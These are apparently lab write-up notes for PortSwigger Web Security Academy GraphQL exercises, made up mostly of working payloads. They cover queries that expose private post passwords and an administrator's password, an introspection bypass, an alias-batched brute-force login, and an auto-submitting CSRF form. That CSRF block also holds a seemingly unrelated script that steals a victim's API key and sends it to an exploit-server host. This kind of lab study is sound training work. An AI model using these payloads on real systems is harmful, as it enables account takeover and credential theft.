# GraphQL API Vulnerabilities

[GraphQL Visualizer](https://graphql-kit.com/graphql-voyager/)
## Lab: Accessing private GraphQL posts
```json
{"query":"\nquery getBlogSummaries {\n    getBlogPost(id:3) {\n        image\n        title\n        summary\n        id\n  isPrivate \n postPassword \n   }\n}","operationName":"getBlogSummaries"}
```

## Lab: Accidental exposure of private GraphQL fields

1. introspection query
2. find administrator
```json
{"query":"\nquery getUser {\n    getUser(id:1) {\n        id\n   username\n      password\n      }\n}","operationName":"getUser"}
```

## Lab: Finding a hidden GraphQL endpoint
1. Try common endpoint, find `/api`.
2. Bypass introspection defense by add a breaklin(%02a) after `__schema`.
3. Save the GraphQL queries to site map, and find the `getUser` and `deleteUser` Query.
4. Delete carlos(id: 3).

## Lab: Bypassing GraphQL brute force protections

Edit in `GraphQL` tab.
```json
 mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }
          ...
 }
```

## Lab: Performing CSRF exploits over GraphQL

```html
<body>
    <meta name="referrer" content="never">
    <form method="POST"
        action="https://0aa600fa042f042b832e460c00050027.web-security-academy.net/graphql/v1">
        <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }">
        <input type="hidden" name="operationName" value="changeEmail" />
        <input type="hideen" name="variables" value='{"input":{"email":"hacke11213r@hacker.com"}}' />
    </form>
    <script>
        document.forms[0].submit();
    </script>
    <script>
        document.location = "https://stock.0a22009104211e5a80c844d600a3000c.web-security-academy.net/?productId=3%3Cscript%3Efetch(%27https://0a22009104211e5a80c844d600a3000c.web-security-academy.net/accountDetails%27,%20{%20credentials:%20%27include%27%20}).then(r%20=%3E%20r.json()).then(j%20=%3E%20{%20document.location%20=%20%22https://exploit-0a2b0010040d1e598057439701bd0016.exploit-server.net/log?key=%22%20+%20%2Bj.apikey;%20})%3C/script%3E&storeId=1"
    </script>
</body>
```